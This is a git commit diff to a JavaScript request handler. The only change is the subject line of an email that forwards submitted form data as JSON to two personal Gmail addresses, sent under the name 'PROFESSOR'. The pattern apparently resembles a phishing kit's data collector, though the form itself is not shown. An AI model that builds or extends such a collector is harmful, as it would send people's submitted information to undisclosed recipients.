63ba669218bc9d3c3bf16a004d1ebddd672c262d
mbkhan1122 <malijaan414@gmail.com>
2025-08-12 09:52:54 +0500

    Update tm.js

--- tm.js
+++ tm.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <hgfver414@gmail.com>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
-      subject: "Taimor",
+      subject: "taimoor",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
